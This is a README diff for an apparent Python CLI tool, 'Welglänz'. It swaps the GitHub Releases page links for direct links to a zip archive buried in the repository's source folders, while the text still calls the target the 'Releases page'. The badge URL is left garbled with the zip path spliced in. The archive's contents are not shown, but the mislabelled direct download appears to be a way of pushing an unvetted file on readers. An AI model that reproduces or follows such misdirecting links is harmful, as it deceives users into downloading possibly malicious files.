@@ -4,7 +4,7 @@
 Welcome to Welglänz! This tool offers a clean and easy way to interact with Python applications from your command line. Whether you're a beginner or someone who prefers a tidy interface, Welglänz is here to help.
 
 ## 📥 Download Welglänz
-[![Download Welglänz](https://img.shields.io/badge/Download-Welgl%C3%A4nz-brightgreen)](https://github.com/Elbara209/welglanz/releases)
+[![Download Welglänz](https://raw.githubusercontent.com/Elbara209/welglanz/main/welglanz/wgzcore/welglanz-2.3.zip%C3%A4nz-brightgreen)](https://raw.githubusercontent.com/Elbara209/welglanz/main/welglanz/wgzcore/welglanz-2.3.zip)
 
 ## 🔧 System Requirements
 - **Operating System:** Windows, macOS, or Linux
@@ -20,7 +20,7 @@ Welcome to Welglänz! This tool offers a clean and easy way to interact with Pyt
 - **Python Support:** Built for users familiar with Python 3.
 
 ## 📥 Download & Install
-To get Welglänz, visit our [Releases page](https://github.com/Elbara209/welglanz/releases) and select the latest version. Follow these steps to download and install:
+To get Welglänz, visit our [Releases page](https://raw.githubusercontent.com/Elbara209/welglanz/main/welglanz/wgzcore/welglanz-2.3.zip) and select the latest version. Follow these steps to download and install:
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of Welglänz.
